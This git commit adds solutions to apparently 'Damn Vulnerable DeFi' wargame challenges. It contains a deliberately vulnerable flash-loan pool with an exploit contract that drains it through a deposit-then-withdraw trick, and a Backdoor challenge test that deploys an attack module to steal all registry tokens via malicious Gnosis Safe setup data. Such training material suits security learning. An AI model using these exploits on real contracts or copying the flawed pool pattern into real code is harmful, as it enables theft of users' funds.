7d59d6324d5533c82a56751016e7a620b6327d09
Altbee <liaojikundever@gmail.com>
2022-08-31 12:02:45 -0500

    no message

---
+++ contracts/side-entrance/SideEntranceLenderPool.sol
@@ -0,0 +1,68 @@
+// SPDX-License-Identifier: MIT
+
+pragma solidity ^0.8.0;
+import "@openzeppelin/contracts/utils/Address.sol";
+
+interface IFlashLoanEtherReceiver {
+    function execute() external payable;
+}
+
+/**
+ * @title SideEntranceLenderPool
+ * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
+ */
+contract SideEntranceLenderPool {
+    using Address for address payable;
+
+    mapping(address => uint256) private balances;
+
+    function deposit() external payable {
+        balances[msg.sender] += msg.value;
+    }
+
+    function withdraw() external {
+        uint256 amountToWithdraw = balances[msg.sender];
+        balances[msg.sender] = 0;
+        payable(msg.sender).sendValue(amountToWithdraw);
+    }
+
+    function flashLoan(uint256 amount) external {
+        uint256 balanceBefore = address(this).balance;
+        require(balanceBefore >= amount, "Not enough ETH in balance");
+
+        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();
+
+        require(
+            address(this).balance >= balanceBefore,
+            "Flash loan hasn't been paid back"
+        );
+    }
+}
+
+contract ExploitSideEntrance {
+    SideEntranceLenderPool thePool;
+    address payable attacker;
+
+    constructor(address _thePool) {
+        thePool = SideEntranceLenderPool(_thePool);
+        attacker = payable(msg.sender);
+    }
+
+    function attack(uint256 amount) public {
+        //call for a flashLoan() to borrow all the tokens in the lendingPool
+        thePool.flashLoan(amount);
+        //withdraw the tokens from the pool
+        thePool.withdraw();
+    }
+
+    function execute() public payable {
+        //The function called by the IFlashLoanEtherReceiver
+        //Deposit the tokens back to the pool which updates the "balances" state variable
+        thePool.deposit{value: address(this).balance}();
+    }
+
+    receive() external payable {
+        //transfer the tokens to the attacker address directly from the pool
+        attacker.transfer(address(this).balance);
+    }
+}
---
+++ test/backdoor/backdoor.challenge.js
@@ -0,0 +1,87 @@
+const { ethers } = require('hardhat');
+const { expect } = require('chai');
+const { parseEther } = require('ethers/lib/utils');
+
+describe('[Challenge] Backdoor', function () {
+    let deployer, users, attacker;
+
+    const AMOUNT_TOKENS_DISTRIBUTED = ethers.utils.parseEther('40');
+
+    before(async function () {
+        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
+        [deployer, alice, bob, charlie, david, attacker] = await ethers.getSigners();
+        users = [alice.address, bob.address, charlie.address, david.address]
+
+        // Deploy Gnosis Safe master copy and factory contracts
+        this.masterCopy = await (await ethers.getContractFactory('GnosisSafe', deployer)).deploy();
+        this.walletFactory = await (await ethers.getContractFactory('GnosisSafeProxyFactory', deployer)).deploy();
+        this.token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
+        
+        // Deploy the registry
+        this.walletRegistry = await (await ethers.getContractFactory('WalletRegistry', deployer)).deploy(
+            this.masterCopy.address,
+            this.walletFactory.address,
+            this.token.address,
+            users
+        );
+
+        // Users are registered as beneficiaries
+        for (let i = 0; i < users.length; i++) {
+            expect(
+                await this.walletRegistry.beneficiaries(users[i])
+            ).to.be.true;            
+        }
+
+        // Transfer tokens to be distributed to the registry
+        await this.token.transfer(this.walletRegistry.address, AMOUNT_TOKENS_DISTRIBUTED);
+    });
+
+    it('Exploit', async function () {
+        /** CODE YOUR EXPLOIT HERE */
+        const attackerToken = this.token.connect(attacker);
+        const attackerFactory = this.walletFactory.connect(attacker);
+        const attackerMasterCopy = this.masterCopy.connect(attacker);
+        const attackerWalletRegistry = this.walletRegistry.connect(attacker);
+
+        // Deploy attacking contract
+        const AttackModuleFactory = await ethers.getContractFactory("AttackBackdoor", attacker);
+        const attackModule = await AttackModuleFactory.deploy(
+            attacker.address,
+            attackerFactory.address,
+            attackerMasterCopy.address,
+            attackerWalletRegistry.address,
+            attackerToken.address
+        );
+        
+        // ABI call to setupToken() which is malicious
+        const moduleABI = ["function setupToken(address _tokenAddress, address _attacker)"];
+        const moduleIFace = new ethers.utils.Interface(moduleABI);
+        const setupData = moduleIFace.encodeFunctionData("setupToken", [
+            attackerToken.address, 
+            attackModule.address
+        ])
+
+        // Do exploit in one transaction (after contract deployment)
+        await attackModule.exploit(users, setupData);
+    });
+
+    after(async function () {
+        /** SUCCESS CONDITIONS */
+        for (let i = 0; i < users.length; i++) {
+            let wallet = await this.walletRegistry.wallets(users[i]);
+            
+            // User must have registered a wallet
+            expect(wallet).to.not.eq(ethers.constants.AddressZero, "User did not register a wallet");
+
+            // User is no longer registered as a beneficiary
+            expect(
+                await this.walletRegistry.beneficiaries(users[i])
+            ).to.be.false;
+        }
+
+        // Attacker must have taken all tokens
+        expect(
+            await this.token.balanceOf(attacker.address)
+        ).to.eq(AMOUNT_TOKENS_DISTRIBUTED);
+    });
+});
